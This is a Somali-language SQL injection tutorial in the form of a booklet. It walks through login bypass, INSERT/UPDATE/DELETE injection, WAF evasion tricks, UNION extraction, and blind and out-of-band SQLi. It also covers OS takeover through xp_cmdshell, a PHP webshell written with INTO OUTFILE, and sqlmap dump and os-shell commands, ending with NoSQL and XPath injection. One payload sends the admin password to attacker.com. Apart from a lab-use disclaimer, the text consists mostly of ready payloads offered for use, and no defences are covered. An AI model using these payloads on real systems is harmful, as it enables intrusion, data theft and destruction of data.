# SQLinjectionAFsoomali


```markdown
# SQL INJECTION

_November 23 at 3:57 AM_

**بسم الله الرحمن الرحيم**

---

## Tusmada Buugga

1.  [Hordhaca Weerarada "Injection" iyo Sida Loo Dhaafo "Login"-ka.](#casharka-1-hordhaca-weerarada-injection-iyo-sida-loo-dhaafo-login-ka)
2.  [Aasaaska SQL Injection - Noocyada SELECT iyo INSERT.](#casharka-2-aasaaska-sql-injection---weerarada-select-iyo-insert)
3.  [SQL Injection-ka Sare - Noocyada UPDATE iyo DELETE iyo Sida Loo Dhaafo Difaacyada.](#casharka-3-sql-injection-ka-sare---weerarada-update-delete-iyo-dhaafidda-difaacyada)
4.  Ka Faa'iidaysiga Sare ee SQL Injection - Weerarka UNION.
5.  Ka Faa'iidaysiga (Blind SQLi).
6.  Weerarada ka Baxsan SQL Injection - Sida Loola Wareego Database-ka iyo OS-ka.
7.  Weerarada NoSQL iyo XPath Injection.

---
# hordhac

Ku soo dhawow buuggan kooban ee ku saabsan SQL Injection. Inkastoo uusan buuggani si buuxda u dabooli doonin baaxadda weyn ee mowduucan, haddana waxaan rajaynayaa inuu noqdo hage iyo albaab wanaagsan oo uu ka galo qof kasta oo ku cusub barashada amniga web-ka.
Hadafka ugu weyn ee aan ka leeyahay waa inaan wadaagno aqoon waxtar leh oo aan is-dhaafsano.
aqoontani waxay leedahay laba waji. Sidaa darteed, mas'uul kama ihi cawaaqibka ka dhasha adeegsiga aqoontan si khaldan. Haddii aad tijaabo ku samayso database ama website aadan fasax u haysan, mas'uuliyadda dembigaas adiga ayaa qaadi doona.
Si aad si ammaan ah ugu tababarto casharrada ku jira buuggan, waxaa lagama maarmaan ah inaad isticmaasho lab kuu gaar ah. Waxaa jira lab-yo badan oo bilaash ah, midka aan anigu inta badan isticmaalo kuna talinayo waa OWASP BWA (Broken Web Applications Project).
Wixii talo, tusaale, ama su'aal dheeri ah, waxaad igala soo xiriiri kartaan:
Mobile: +252 61 998 7794
Email: arkani6563@gmail.com

## waxaa dhici karta inta aan qoreynay inuu khalad naga dhacay ama aan wax ka tagnay ee fadlan buuga la deg asigaa ka fiican


## Casharka 1: Hordhaca Weerarada "Injection" iyo Sida Loo Dhaafo "Login"-ka

Casharkan, waxaan ku baran doonaa fikradda aasaasiga ah ee ka dambaysa dhammaan weerarada "injection" iyo tusaalaha ugu caansan ee ah sida loogu isticmaalo in lagu dhaafo bogga "login"-ka.

### Waa maxay "Injection"?
"Injection" waa nooc weerar ah oo dhaca marka xog uu soo geliyay user (oo ah mid aan la aamini karin) ay si qalad ah ugu dhex milanto code ama amarro uu server-ku fulinayo. Halkii xogta loola dhaqmi lahaa sidii macluumaad caadi ah, waxaa loo fasirtaa sidii amar la fulinayo.

### Fikradda Aasaasiga ah: Ka Baxsashada Macnaha Xogta (Breaking out of the Data Context)
Ka soo qaad in website-ku uu ku weydiiyo magacaaga, adiguna aad geliso `cali`. Server-ku wuxuu dhisayaa amar u eg sidan:
`"Soo hel macluumaadka qofka magaciisu yahay 'cali'"`

Hadda, ka soo qaad inaad tahay hacker oo aad geliso: `cali' or '1'='1`

Amarkii wuxuu isu beddelayaa:
`"Soo hel macluumaadka qofka magaciisu yahay 'cali' or '1'='1'`

Qaybta dambe ee `' or '1'='1'` hadda maaha magac, laakiin waa amar `logical command` oo had iyo jeer run ah. Waxaad ka baxday macnihii xogta (magaca) oo aad u gudubtay macnihii amarka. Tani waa nuxurka "injection".

### Sida Loo Dhaafo "Login"-ka (Bypassing a Login)
Kani waa tusaalaha ugu caansan ee SQL Injection. Marka aad "login" garayso, server-ku wuxuu samaynayaa `query` SQL ah oo u eg sidan:
```sql
SELECT * FROM users WHERE username = 'isticmaalaha' AND password = 'password-ka';
```
Hacker-ka wuxuu isku dayayaa inuu wax ka beddelo weydiintaas si uu u tirtiro qaybta hubinaysa password-ka.

#### Weerarka 1aad (Haddii aad taqaanid username)
*   **Username:** `admin'-- `
    *   *(F.G: Labada xariiq ee isku xiga (`-- `) waa calaamadda "comment"-ka ee SQL, waxayna ka dhigan tahay "iska indho tir waxa ka dambeeya").*
*   **Password:** Wax kasta.

Weydiinta waxay noqonaysaa:
```sql
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'waxkasta';
```
Database-ku wuxuu fulinayaa oo kaliya `SELECT * FROM users WHERE username = 'admin'`, wuuna ku soo gelinayaa adigoon password-ka saxda ah gelin!

#### Weerarka 2aad (Haddii aadan aqoon username)
*   **Username:** `' OR 1=1-- `
*   **Password:** Wax kasta.

Weydiinta waxay noqonaysaa:
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'waxkasta';
```
Maadaama `1=1` ay had iyo jeer run tahay, weydiintu waxay soo celinaysaa dhammaan isticmaalayaasha. Inta badan, website-ku wuxuu si toos ah kuu gelinayaa akoonka ugu horreeya ee uu helo, kaas oo inta badan ah kan maamulaha (admin).

---

## Casharka 2: Aasaaska SQL Injection - Weerarada SELECT iyo INSERT

Casharkan, waxaan diiradda saari doonaa labada nooc ee ugu caansan ee weydiimaha SQL ee la weeraro: `SELECT` (oo loo isticmaalo in xog lagu soo saaro) iyo `INSERT` (oo loo isticmaalo in xog lagu daro).

### A. Injecting into `SELECT` Statements

**Goorta la Isticmaalo:**
`SELECT` waxaa la isticmaalaa mar kasta oo website-ku uu u baahan yahay inuu xog ka soo saaro database-ka. Tusaale:
*   Markaad raadinayso badeeco.
*   Markaad eegayso profile-ka isticmaale.
*   Markaad akhrinayso maqaal.

**Barta Jilicsan:**
Inta badan, xogta aad geliso waxay ku dhammaataa qaybta `WHERE` ee weydiinta.
```sql
SELECT * FROM products WHERE name = 'XOGTAADA';
```

**Weerarka Caadiga ah:**
Sidaan horey u aragnay, hadafka koowaad waa in la beddelo shuruudda `WHERE` si loo soo saaro xog aan laguu talagalin.
*   `' OR 1=1-- ` -> Soo saar dhammaan waxyaabaha ku jira shaxda (table).

### B. Injecting into `INSERT` Statements

**Goorta la Isticmaalo:**
`INSERT` waxaa la isticmaalaa marka xog cusub lagu darayo database-ka. Tusaale:
*   Markaad isdiiwaangelinayso.
*   Markaad fariin ku qorayso "forum".
*   Markaad dalbanayso badeeco.

**Barta Jilicsan:**
Xogtaada waxaa la gelinayaa qaybta `VALUES`.
```sql
INSERT INTO users (username, password) VALUES ('XOGTAADA_USER', 'XOGTAADA_PASS');
```

**Weerarka:**
Halkan, hadafku waa in la xiro weydiinta `INSERT` ee hadda socota oo la bilaabo mid cusub, ama in la beddelo qiimayaasha la gelinayo.

**Tusaale:** Ka soo qaad inaad isdiiwaangelinayso oo aad geliso username-kan:
`cali', 'password123'), ('admin', 'password123');-- `

Weydiinta waxay noqonaysaa:
```sql
INSERT INTO users (username, password) VALUES ('cali', 'password123'), ('admin', 'password123');-- ', 'password_ka_dhabta_ah');
```
Halkan, waxaad si guul leh ugu dartay laba isticmaale (adiga iyo admin) hal codsi gudihiis! Caqabadda jirta waa inaad si sax ah u qiyaastaa tirada iyo nooca tiirarka (columns) si aadan u jebin qaab-dhismeedka weydiinta.

### C. Second-Order SQL Injection

Tani waa farsamo aad u khiyaano badan.

*   **Tallaabada 1aad:** Waxaad gelisaa xog xaasidnimo ah (tusaale, `' OR 1=1-- `) meel ay u muuqato in si ammaan ah loo maareeyay. Xogtan waxaa lagu kaydinayaa database-ka.
*   **Tallaabada 2aad:** Marka dambe, qayb kale oo website-ka ka mid ah ayaa xogtaas ka soo akhrinaysa database-ka oo si toos ah ugu isticmaalaysa weydiin kale iyadoon mar kale hubin. Markan, maadaama ay database-ka ka timid, waxaa loo malaynayaa inay ammaan tahay. Halkan ayuu weerarku ka dhacayaa, sababtoo ah koodhkii xaasidnimada ahaa ee la kaydiyay ayaa hadda la fulinayaa.

**Tusaale:** Waxaad isku diiwaangelinaysaa username-ka `'--`. Website-ku wuu aqbalayaa. Marka xigta, marka aad isku daydo inaad password-ka beddesho, website-ku wuxuu samaynayaa weydiin u eg: `UPDATE users SET password='new' WHERE username='''--'`. Halkan, weydiintu way jarmaysaa oo waxay noqonaysaa `UPDATE users SET password='new' WHERE username=''`, taasoo laga yaabo inay beddesho password-ka isticmaale kale.

### Tijaabi oo Isticmaal SQLMap
SQLMap waa qalabka ugu awoodda badan ee si toos ah u hela ugana faa'iidaysta SQL Injection.

**Sida Loo Isticmaalo:**

1.  **Hel URL Nugul:** Marka hore, si gacanta ah u hel meel aad ka shakisan tahay inay leedahay SQLi (tusaale, meel aad gelisay `'` oo uu qalad ka dhashay).
2.  **Amarka Aasaasiga ah:**
    ```bash
    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
    ```
    *   `-u` = waxay u taagan tahay URL-ka la beegsanayo.

3.  **Soo Saarka Database-yada:** Marka uu helo nuglaanshaha, waxaad weydiin kartaa inuu kuu soo saaro liiska database-yada.
    ```bash
    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
    ```

4.  **Soo Saarka Shaxda (Tables):**
    ```bash
    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart --tables
    ```
    *   `-D`: Magaca database-ka, `--tables`: Soo saar shaxda.

5.  **Soo Saarka Xogta:**
    ```bash
    sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D acuart -T users -C uname,pass --dump
    ```

---

## Casharka 3: SQL Injection-ka Sare - Weerarada UPDATE, DELETE, iyo Dhaafidda Difaacyada

Casharkan, waxaan diiradda saari doonaa sida loo weeraro weydiimaha wax ka beddela (`UPDATE`) iyo kuwa wax tirtira (`DELETE`), iyo sida loo isticmaalo farsamooyin fudud si looga gudbo difaacyada aasaasiga ah.

### A. Injecting into `UPDATE` Statements

**Goorta la Isticmaalo:**
`UPDATE` waxaa la isticmaalaa marka la cusboonaysiinayo xog horey u jirtay. Tusaale:
*   Markaad beddelayso profile-kaaga.
*   Markaad beddelayso password.

**Barta Jilicsan:**
Sida `SELECT`, inta badan xogtaada waxay ku dhammaataa qaybta `WHERE`, taasoo go'aaminaysa riikoorkee la beddelayo.
```sql
UPDATE users SET password = 'password_cusub' WHERE username = 'XOGTAADA_USER';
```

**Weerarka:**
Hadafku waa in la beddelo shuruudda `WHERE` si loo cusboonaysiiyo riikoorka qof kale, ama xitaa dhammaan riikooryada.

**Tusaale:** Ka soo qaad inaad beddelayso profile-kaaga oo aad geliso username-kan: `cali' OR 1=1-- `

Weydiinta waxay noqonaysaa:
```sql
UPDATE users SET city = 'Hargeisa' WHERE username = 'cali' OR 1=1-- ';
```
Natiijadu waxay noqonaysaa in dhammaan isticmaalayaasha ku jira database-ka magaaladooda laga dhigo "Hargeisa"!

### B. Injecting into `DELETE` Statements

**Goorta la Isticmaalo:**
`DELETE` waxaa la isticmaalaa marka la tirtirayo xog. Tusaale:
*   Markaad tirtirayso fariin ama user.

**Barta Jilicsan:**
Sidoo kale, inta badan waa qaybta `WHERE`.
```sql
DELETE FROM products WHERE product_id = 'XOGTAADA_ID';
```

**Weerarka:**
Sida `UPDATE`, haddii aad maamusho qaybta `WHERE`, waxaad tirtiri kartaa wax ka badan intii laguu talagalay.

**Tusaale:** Haddii aad geliso `123' OR 1=1-- `, weydiintu waxay noqonaysaa:
```sql
DELETE FROM products WHERE product_id = '123' OR 1=1-- ';
```
Tani waxay tirtiraysaa dhammaan badeecada ku jirta database-ka.

### C. Bypassing Basic Filters (Dhaafidda Difaacyada Fudud)

Marka aad hesho SQLi, waxaa laga yaabaa inaad la kulanto difaacyo aasaasi ah. Waa kuwan farsamooyin aad ku dhaafi karto:

1.  **Haddii `'` la mamnuuco:**
    *   Haddii ay tahay meel qoraal ah, waxaad isticmaali kartaa `CHAR()` function-ka.
        *   `'admin'` wuxuu u dhigmaa `CHAR(97, 100, 109, 105, 110)` (MySQL).

2.  **Haddii Meesha Bannaan (space) la mamnuuco:**
    *   Waxaad isticmaali kartaa "comments" si aad u samayso meel bannaan.
        *   `SELECT user FROM users` wuxuu u dhigmaa `SELECT/**/user/**/FROM/**/users`.

3.  **Haddii Erayo Gaar ah la mamnuuco (sida `SELECT`, `UNION`):**
    *   **Case Variation:** Isku day `SeLeCt`, `UnIoN`.
    *   **Comments:** Isku day `SEL/**/ECT`.
    *   **Encoding:** Isku day inaad "URL encode" garayso erayga: `SELECT` -> `%53%45%4C%45%43%54`.

### D. Bypassing WAFs with Obfuscation

WAF-yada casriga ahi way ka caqli badan yihiin. Si aad u dhaafto, waxaad u baahan tahay farsamooyin isku-dhafan.

*   **MySQL Version Comment:**
    *   `UNION SELECT` waxaa loo qori karaa `/*!UNION*/ /*!SELECT*/`. WAF-ku wuxuu u arkaa "comment", laakiin MySQL wuu fulinayaa.

*   **Using Alternative Syntax:**
    *   `1=1` wuxuu u dhigmaa `2>1`, `3-2=1`, `NOT 0`.
    *   `AND` wuxuu u dhigmaa `&&`. `OR` wuxuu u dhigmaa `||`.

### Isticmaalka Qalabka (SQLMap Tamper Scripts)
SQLMap wuxuu leeyahay "tamper scripts" oo si toos ah u beddelaya "payload"-kaaga si ay u dhaafaan WAF-yada.

**Sida Loo Isticmaalo:**

1.  **Eeg liiska "tamper scripts"-ka:**
    ```bash
    sqlmap --list-tampers
    ```
2.  **Dooro mid ama dhowr ka mid ah:**
    ```bash
    # Tusaale: wuxuu beddelayaa meelaha bannaan, wuxuuna ku darayaa comments random ah
    sqlmap -u "URL" --tamper=space2comment,randomcase
    ```
    *   `space2comment.py`: Wuxuu (space) u beddelayaa `/**/`.
    *   `randomcase.py`: Wuxuu `SELECT` ka dhigayaa `SeLeCt`.


## 4: Ka Faa'iidaysiga Sare ee SQL Injection - Weerarka UNION

### Waa maxay UNION Operator?
`UNION` waa amar SQL ah oo loo isticmaalo in lagu isku daro natiijooyinka laba weydiin oo `SELECT` ah ama ka badan, iyadoo la soo saarayo hal natiijo oo isku-dhafan.

### Shuruudaha UNION
Si `UNION` uu u shaqeeyo, labada weydiin waa inay buuxiyaan laba shuruudood oo muhiim ah:
1.  **Tiro isku mid ah oo columns ah (Same Number of Columns):** Labada weydiin waa inay soo celiyaan tiro isku mid ah oo tiirar ah.
2.  **Noocyo Xog oo is-waafaqi kara (Compatible Data Types):** column kasta oo weydiinta koowaad waa inuu lahaadaa nooc xogeed oo la jaan qaadi kara column u dhigma ee weydiinta labaad (tusaale, lambar iyo lambar, qoraal iyo qoraal).

### Sida Weerarku u Dhaco
1.  **Hel Barta Nugul:** Waxaad heshay meel leh SQL Injection oo ku jirta weydiin `SELECT` ah. Tusaale: `SELECT name, description FROM products WHERE id = 'XOGTAADA';`
2.  **Jooji Weydiinta Asalka ah:** Waa inaad marka hore soo afjartaa weydiinta asalka ah si aysan wax natiijo ah usoo celin, si aad si fudud u aragto natiijada weydiintaada cusub. Waxaad tan ku samayn kartaa adigoo siinaya qiime aan jirin: `' AND 1=2`
3.  **Weydiintaada Cusub:** Hadda waxaad ku daraysaa weydiintaada adigoo isticmaalaya `UNION SELECT`. `' AND 1=2 UNION SELECT username, password FROM users-- `
4.  **Weydiinta Buuxda:** Weydiinta kama dambaysta ah ee database-ku fulinayo waxay noqonaysaa:
    ```sql
    SELECT name, description FROM products WHERE id = '' AND 1=2 UNION SELECT username, password FROM users-- ';
    ```
Natiijadu waxay noqonaysaa in website-ku uu soo bandhigo liiska dhammaan usernames-ka iyo passwords-ka, isagoo u malaynaya inay yihiin magacyada iyo sharraxaadaha badeecada!

### Caqabadaha iyo Sida Loo Xalliyo

**Sideen ku ogaanayaa tirada columns?**
Waxaad isticmaali kartaa `ORDER BY` clause. Si isdaba joog ah u tijaabi:
*   `' ORDER BY 1-- ` (Haddii uusan qalad keenin, waxaa jira ugu yaraan 1 column)
*   `' ORDER BY 2-- ` (Haddii uusan qalad keenin, waxaa jira ugu yaraan 2 column)
*   `' ORDER BY 3-- ` (Haddii uu qalad keeno, waxay ka dhigan tahay inaysan jirin 3 column, ee ay yihiin 2).

**Sideen ku ogaanayaa nooca xogta ee columns?**
Uma baahnid inaad si sax ah u ogaato. Waxaad isticmaali kartaa `NULL` meel kasta oo aadan aqoon. `NULL` wuxuu la jaan qaadi karaa nooc kasta oo xogeed.

Markaad hesho tirada saxda ah ee columns (tusaale, 4), waxaad tijaabinaysaa: `' UNION SELECT 'a', NULL, NULL, NULL-- ` , `' UNION SELECT NULL, 'a', NULL, NULL-- ` iyo wixii la mid ah, ilaa aad ka hesho colum-ka soo bandhigaya xarafka 'a'. Kaas ayaa ah column aad u isticmaali doonto inaad xogta kusoo saarto.

### UNION Injection in `INSERT` statements
Waxay dhacdaa marka `INSERT` statement uu isticmaalo `SELECT` si uu xogta u soo saaro.
```sql
INSERT INTO new_users (username, email) SELECT username, email FROM temp_users WHERE signup_date > '2025-01-01';
```
Haddii aad maamusho qayb ka mid ah `WHERE` clause-ka, waxaad ku dari kartaa `UNION SELECT` si aad u geliso xog aan la filayn shaxda `new_users`.

### Isticmaalka Qalabka (SQLMap)
SQLMap wuxuu si toos ah u sameeyaa dhammaan tallaabooyinkan. Markaad siiso URL nugul, wuxuu:
1.  Si toos ah u ogaanayaa tirada columns.
2.  Si toos ah u ogaanayaa noocyada xogta.
3.  Wuxuu isticmaalayaa `UNION` si uu u soo saaro magacyada database-yada, tables, columns, iyo ugu dambayn xogta lafteeda.

**Amarka Lagu Qasbo UNION:** Haddii aad hubto in `UNION` injection uu suurtagal yahay, waxaad ku qasbi kartaa SQLMap inuu si toos ah u isticmaalo farsamadan:
```bash
sqlmap -u "URL" --technique=U --dbs
```
(`--technique=U` waxay u taagan tahay "UNION query SQL injection").

---

## 5: Blind SQL Injection
Casharkan, waxaan ku baran doonaa laba hab oo waaweyn oo loo isticmaalo in xogta looga soo saaro database-ka xaraf-xaraf, iyadoo la adeegsanayo oo kaliya isbeddel yar oo ku yimaada hab-dhaqanka website-ka.

### Waa maxay "Blind SQL Injection"?
Waa nooc SQLi ah oo dhaca marka nuglaanshuhu jiro, laakiin website-ku uusan soo bandhigin wax natiijo ah oo ka timid weydiintaada ama wax fariin qalad ah oo database-ka ka yimid. Jawaabta server-ku waa isku mid, ha ahaato weydiintaadu mid sax ah ama mid qaldan.

### Sidee baan ku ogaanayaa inuu jiro?
Waa inaad raadisaa isbeddel yar oo ku yimaada hab-dhaqanka website-ka oo aad adigu sababi karto. Waxaa jira laba nooc oo waaweyn:

### A. Boolean-Based Blind SQL Injection
Waxaad samaynaysaa weydiin SQL ah oo ku daraysa shuruud (`AND`) run ah ama been ah. Kadib, waxaad eegaysaa haddii ay jirto farqi yar oo u dhexeeya jawaabta marka shuruuddu run tahay iyo marka ay been tahay.

**Tusaale:** Ka soo qaad bog soo bandhigaya maqaal: `view.php?id=1`.
*   **Shuruud Run ah:** `' AND 1=1-- ` -> Boggu si caadi ah ayuu u soo baxayaa.
*   **Shuruud Been ah:** `' AND 1=2-- ` -> Boggu wuxuu soo saarayaa "Maqaal lama helin".

#### Sida Xogta Loogu Soo Saaro
Hadda oo aad haysato hab aad ku kala saarto "Run" iyo "Been", waxaad weydiin kartaa su'aal kasta oo aad rabto.
*   **Su'aasha 1aad:** "Magaca database-ka ma wuxuu ka kooban yahay 5 xaraf?"
    `' AND (SELECT LENGTH(database())) = 5-- `
*   **Su'aasha 2aad:** "Xarafka koowaad ee magaca database-ka ma 'd' baa?"
    `' AND (SELECT SUBSTRING(database(), 1, 1)) = 'd'-- `

Waxaad sii wadaysaa ilaa aad ka hesho xaraf kasta, adigoo isku daraya natiijooyinka si aad u hesho erayga oo dhan. Tani waa hab aad u gaabis ah laakiin aad u awood badan.

### B. Time-Based Blind SQL Injection
Tani waa habka ugu dambeeya ee la isticmaalo marka aysan jirin wax farqi ah oo la arki karo oo u dhexeeya jawaabaha. Waxaad ku qasbaysaa database-ka inuu sugo (delay) muddo cayiman haddii shuruuddaadu ay run tahay.

**Tusaale:**
*   **Shuruud Run ah (MySQL):** `' AND IF((SELECT LENGTH(database())) = 5, SLEEP(10), 0)-- `
    Haddii dhererka magaca database-ku yahay 5, server-ku wuxuu sugayaa 10 ilbiriqsi ka hor inta uusan jawaabin. Haddii kale, isla markiiba wuu jawaabayaa.

Waxaad cabbiraysaa waqtiga ay ku qaadanayso server-ka inuu jawaabo. Haddii uu dib u dhaco, waxaad ogtahay in shuruuddaadu ay run ahayd. Haddii kale, waxay ahayd been.

### C. Out-of-Band SQL Injection (OOB SQLi)
Tani waa farsamo la isticmaalo marka aysan jirin wax jawaab ah oo la arki karo haba yaraatee.

Waxaad ku amraysaa database-ka inuu sameeyo isku xir shabakadeed (network connection) oo uu xogta ku soo diro server adiga kuu gaar ah.

**Tusaale (Oracle):**
`' AND UTL_HTTP.request('http://attacker.com/' || (SELECT password FROM users WHERE username='admin'))-- `
Halkan, database-ku wuxuu isku dayayaa inuu booqdo URL ay ku jiraan password-ka admin-ka. Adiguna waxaad dhegaysanaysaa server-kaaga si aad u qabato codsigaas.

Tani waxay inta badan shaqeysaa oo kaliya haddii firewall-ka uusan si adag u xannibin isku xirka dibadda.

---

## 6: Weerarada ka Baxsan SQL Injection - Sida Loola Wareego Database-ka iyo OS-ka

Markaad hesho SQL Injection, waxaad si toos ah ula hadlaysaa database-ka. Laakiin, database-yada casriga ahi maaha oo kaliya kayd xogeed; waa barnaamijyo adag oo awood u leh inay la falgalaan Operating System-yada.

### A. Sida Loola Wareego Database-ka (Database Takeover)
Ka hor inta aadan gaarin OS-ka, waa inaad marka hore heshaa awoodaha ugu sarreeya ee database-ka laftiisa (sida `dba` ee Oracle ama `sa` ee MS-SQL).

**Sida Loo Sameeyo:**
Hel nuglaansho ku jira database-ka. Haddii aad awoodo inaad fuliso weydiin SQL ah, waxaad ka faa'iidaysan kartaa nuglaanshooyinkaas si aad awooddaada u kordhiso. Tusaale, noocyo hore oo Oracle ah, waxaa jiray "stored procedures" la weerari karay si loo helo awood `dba`.

Mararka qaarkood, passwords-ka isticmaalayaasha awoodda badan waxaa lagu kaydiyaa faylal uu database-ku akhrin karo.

### B. Sida Loola Wareego OS-ka
Markaad hesho awoodaha ugu sarreeya ee database-ka, waxaad inta badan awood u yeelanaysaa inaad fuliso amarro OS ah.

#### MS-SQL (`xp_cmdshell`)
*   **Waa maxay?** Kani waa "extended stored procedure" caan ah oo ku jira MS-SQL kaas oo kuu oggolaanaya inaad si toos ah u fuliso amarro Windows Command Prompt ah.
*   **Sida Loo Isticmaalo:** `EXEC master..xp_cmdshell 'whoami';`
*   **Caqabadda:** Noocyada cusub ee MS-SQL, `xp_cmdshell` waa la joojiyay (disabled) si default ah. Laakiin, haddii aad leedahay awood `sa`, waad awoodsiin kartaa adigoo isticmaalaya dhowr amar oo SQL ah.

#### Oracle (Java & External Procedures)
Oracle wuu ka adag yahay, laakiin waa suurtagal. Waxaa la isticmaali karaa awoodda Java ee ku dhex jirta database-ka si loo sameeyo function fulinaya amarro OS ah.

#### MySQL (`UDF` & `INTO OUTFILE`)
*   **User-Defined Functions (UDF):** MySQL wuxuu kuu oggolaanayaa inaad samayso function-no adiga kuu gaar ah adigoo ka soo dejinaya fayl `.so` (Linux) ama `.dll` (Windows) ah. Hacker-ka wuxuu marka hore u baahan yahay inuu awoodo inuu faylkaas "upload" gareeyo server-ka.
*   **`SELECT ... INTO OUTFILE`:** Farsamadan waxay kuu oggolaanaysaa inaad natiijada weydiin kasta ku qorto fayl server-ka ku yaal.
    *   **Weerarka:** Waxaad samayn kartaa fayl PHP ah oo fudud oo ah "webshell" oo aad ku kaydiso meel web-ku uu geli karo.
        ```sql
        SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
        ```
    *   Hadda, waxaad booqan kartaa `http://example.com/shell.php?cmd=whoami` si aad u fuliso commands.

### Post-Exploitation
Markaad hesho RCE, shaqadu halkaas kuma eka. Tallaabada xigta waa inaad samaysato "reverse shell" si aad u hesho terminal (interactive terminal), kadibna aad isku daydo inaad awooddaada ka sii kordhiso heerka "root" ama "SYSTEM".

### Isticmaalka Qalabka (SQLMap OS Shell)
SQLMap wuxuu si cajiib ah u fududeeyaa habkan oo dhan. Marka uu helo SQLi oo uu aqoonsado database-ka iyo awoodahaaga, wuxuu si toos ah isugu dayaa inuu helo RCE.

**Sida Loo Isticmaalo:**
1.  Marka hore, hubi awoodahaaga:
    ```bash
    sqlmap -u "URL" --is-dba
    ```
2.  Haddii aad tahay DBA, isku day inaad hesho "OS shell":
    ```bash
    sqlmap -u "URL" --os-shell
    ```
SQLMap wuxuu si toos ah isugu dayi doonaa farsamooyin kala duwan (sida `xp_cmdshell`, `UDF` injection, iwm.) si uu kuu siiyo terminal aad ku qori karto amarro OS ah.

---

## 7: Weerarada NoSQL iyo XPath Injection

### A. XPath Injection
*   **Waa maxay XPath?** Waa luqad weydiin ah oo loo isticmaalo in lagu dhex socdo laguna soo saaro xogta ku jirta faylasha XML. Waa sidii SQL oo kale, laakiin loogu talagalay XML.
*   **Goorta la Isticmaalo:** Marka website-ku uu xogtiisa ku kaydiyo faylal XML ah halkii uu ka isticmaali lahaa database.
*   **Fikradda Weerarka:** Waa isku mid sida SQLi. Waxaad isku dayaysaa inaad ka baxdo macnaha xogta oo aad wax ka beddesho weydiinta XPath.
    *   **Weydiinta Caadiga ah:** `//users/user[username='XOGTAADA_USER' and password='XOGTAADA_PASS']`
    *   **Weerarka:** Sida SQLi, waxaad isticmaali kartaa `' or '1'='1`.
        *   **Username:** `cali' or '1'='1`
        *   **Weydiinta waxay noqonaysaa:** `//users/user[username='cali' or '1'='1' and password='...']`
        *   Tani waxay soo celinaysaa dhammaan isticmaalayaasha.
*   **Sida Loo Helo:** Calaamadaha lagu garto waa isku mid sida SQLi. Isku day inaad geliso `'` oo eeg haddii qalad dhaco. Farqiga ayaa ah in fariinta qaladku ay xusi doonto wax la xiriira "XPath" ama "XML".

### B. NoSQL Injection
*   **Waa maxay NoSQL?** Waa nooc database ah oo aan isticmaalin qaab-dhismeedka shaxda (tables) ee SQL. Waxay xogta u kaydiyaan si ka duwan, inta badan qaab JSON ah (sida MongoDB).
*   **Goorta la Isticmaalo:** Websites-ka casriga ah, gaar ahaan kuwa isticmaala Node.js.
*   **Fikradda Weerarka:** Maadaama weydiimaha inta badan lagu qoro luqado (sida JavaScript), weerarku wuxuu ku xiran yahay sida luqaddaas loo maareeyo.
    *   **Tusaale (MongoDB):** Ka soo qaad in "login"-ku uu u qoran yahay sidan:
        ```javascript
        db.users.find({ username: '$username', password: '$password' });
        ```
    *   Haddii aad geliso password-ka `'$ne': ''`, weydiintu waxay noqonaysaa:
        ```javascript
        db.users.find({ username: 'admin', password: {'$ne': ''} });
        ```
    *   `$ne` macnaheedu waa "not equal". Weydiintani waxay soo celinaysaa isticmaalaha `admin` haddii password-kiisu uusan ahayn mid madhan (taasoo inta badan run ah), sidaasna lagu dhaafayo hubintii password-ka!
*   **Sida Loo Helo:** Tani way ka adag tahay. Waa inaad fahamtaa luqadda weydiinta ee database-ka la isticmaalayo (sida MongoDB query syntax) oo aad tijaabisaa "operators" kala duwan sida `$ne`, `$gt` (greater than), iwm.

### Blind NoSQL Injection
Sida SQLi, haddii aadan arki karin wax jawaab ah, waxaad isticmaali kartaa farsamooyin "blind". Tusaale, waxaad samayn kartaa weydiin sababaysa dib u dhac waqti haddii shuruud gaar ah ay run tahay.
```javascript
// Haddii xarafka koowaad ee password-ka admin yahay 'p', sug 5 ilbiriqsi
if (this.password.match(/^p.*/)) { sleep(5000); }
```
```
